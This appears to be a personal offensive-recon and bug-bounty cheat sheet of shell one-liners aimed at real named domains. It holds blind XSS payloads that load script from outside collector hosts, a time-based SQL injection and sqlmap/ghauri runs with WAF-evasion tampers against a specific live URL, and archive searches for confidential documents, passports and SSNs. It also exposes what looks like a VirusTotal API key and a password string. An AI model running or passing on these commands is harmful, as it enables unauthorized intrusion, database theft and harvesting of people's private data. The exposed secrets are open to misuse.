subfinder -d example.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload "><script src=https://xss.report/c/coffinxp></script>" -parameters

subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

python3 corsy.py -i /home/mark/Hunt/http.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION-Hacked"

nuclei -list subdomains_alive.txt  -tags cves, osint, tech

cat allurls.txt | gf lfi | nuclei -tags lfi

cat urls.txt | gf redirect | openredirex -p /root/wordlists/openredirect


Blind XSS In Parameters
subfinder -d uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters

Blind XSS In X-Forwarded-For Header

subfinder -d uber.com | gau | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"

cat xss.txt | sed 's/=.*/=/' | dalfox pipe   --waf-evasion  



ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"

ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"


cat xss.txt | sed 's/=.*/=/'| dalfox pipe


blind sql 

https://www.spartanien.de/recomend?actionid=396

payload T (SELECT(0)FROM(SELEC(SLEEP(6)))a)




sqlmap -u  "https://www.spartanien.de/recomend?actionid=396"" -D spartanien_db 


 sqlmap -u https://www.spartanien.de/recomend?actionid=396 --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs --tables spartanien_db

 k@&w~WWWgU9kD2Q


 cat http.txt | awk '{print $2}' | tr -d '[]'  remove [ ]  
 cat http.txt | awk '{print $1}'  only domain 
 
 
 cat allurls.txt newparms.txt | grep -E "\?.*=" 
 ```
 ```
 subfinder -d viator.com -all -recursive > subdomain.txt

cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

cat allurls.txt | grep -E "\.js$" >> js.txt

cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/

echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30

dirsearch -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json

subfinder -d viator.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '">' -parameters

subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors

nuclei -list ~/vaitor/subdomains_alive.txt -tags cves,osint,tech

cat allurls.txt | gf lfi | nuclei -tags lfi
cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
```
```
CRLF Vulnerability Scanning Methodology
#alltools.py from 1hehaq
python3 alltools.py subenum --target example.com --output all.txt

cat all.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 | anew alive.txt

cat alive.txt | sed 's|$|/|' | anew crlf.txt

python3 loxs.py
```
```
subfinder -d <REDACTED> -all -silent | httpx-toolkit -sc -td -title -silent | grep -Ei 'asp|php|jsp|jspx|aspx'


echo https://payment.<REDACTED> | gau


ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --tech=T


dirsearch -u https://<REDACTED>/ -w payloads/all_attacks.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 --full-url


shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td


ghauri -r request.txt --dbs --batch --level 3 --tech=t 


```
```
RECON METHOD BY ~/.COFFINXP

https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original

https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa22515a025e00df1e3bb2bc4f186b8e919558d576c&domain=example.com

https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/url_list?limit=500&page=1

curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.example.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt

cat output.txt | uro |grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'
```
```
curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.example.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > output.txt 



curl "https://web.archive.org/cdx/search/cdx?url=*.policybazaar.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|git|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|env|apk|msi|dmg|tmp|crt|pem|key|pub|asc)$" | tee output.txt



https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|git|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|env|apk|msi|dmg|tmp|crt|pem|key|pub|asc)$




cat output.txt | grep -Ea '\.pdf' | while read -r url; do curl -s "$url" | pdftotext - | grep -Eaiq'(internal use only confidential strictly private personal & confidential|private|restricted|internal not for distribution|do not share|proprietary|trade secret|classified|sensitive bank statement invoice|salary|contract|agreement non disclosure|passport|social security|ssn date of birth credit card identity|id number|company confidential staff only management only internal only)' && echo "$url"; done



```
